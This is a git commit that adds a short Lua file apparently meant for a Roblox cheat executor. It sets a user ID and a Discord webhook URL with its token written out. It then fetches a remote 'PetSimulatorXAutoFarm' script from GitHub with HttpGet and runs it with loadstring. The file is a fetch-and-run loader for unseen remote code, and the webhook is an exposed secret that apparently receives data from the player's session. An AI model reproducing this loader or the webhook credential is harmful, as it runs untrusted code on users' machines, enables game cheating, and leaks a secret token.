ff7bbecbdba4dfd38a768e468bad85e38b1df265
2Sxnpz <129836880+2Sxnpz@users.noreply.github.com>
2023-04-07 20:45:02 +0700

    Create .lua

---
+++ new/.lua
@@ -0,0 +1,3 @@
+_G.UserID = 2419543577
+_G.WebHook = "https://discord.com/api/webhooks/1092727132062494761/wf7s5kX4eFZ0nKNmUfIhbiUN-3OP7bQI-5ntrOtJDwsF-_IzfxnJwXKm7PqHgCUo3kHW"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua", true))()
